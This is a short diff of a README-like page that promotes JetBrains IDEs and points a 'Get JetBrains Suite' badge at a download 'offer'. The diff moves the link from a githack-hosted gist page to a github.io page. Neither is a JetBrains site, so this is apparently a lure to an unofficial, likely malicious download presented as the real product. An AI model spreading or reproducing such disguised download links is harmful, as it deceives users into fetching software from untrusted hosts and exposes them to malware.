@@ -3,7 +3,7 @@
 **JetBrains** creates world-class developer environments that power productivity and precision for every programming language.  
 From **IntelliJ IDEA** to **PyCharm**, **WebStorm**, and **CLion**, JetBrains IDEs provide intelligent code analysis, real-time refactoring, and deep framework support — built natively for **Apple Silicon** and optimized for **Windows 11**. 💻🍎  
 
-[![🧠 Get GitHub Instruction](https://img.shields.io/badge/🧠%20Get%20JetBrains%20Suite-1565C0?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/mrsmileyandymirny/64495b0e1c73406d5ca5f74abce0e67a/raw/a65de615602a93640d3a0bd5037705238253f61f/app.html?offer=JetBrainsApp)
+[![🧠 Get GitHub Instruction](https://img.shields.io/badge/🧠%20Get%20JetBrains%20Suite-1565C0?style=for-the-badge&logo=github&logoColor=white)](https://git-app-desk.github.io/.github/?offer=JetBrainsApp)
 
 ---
 
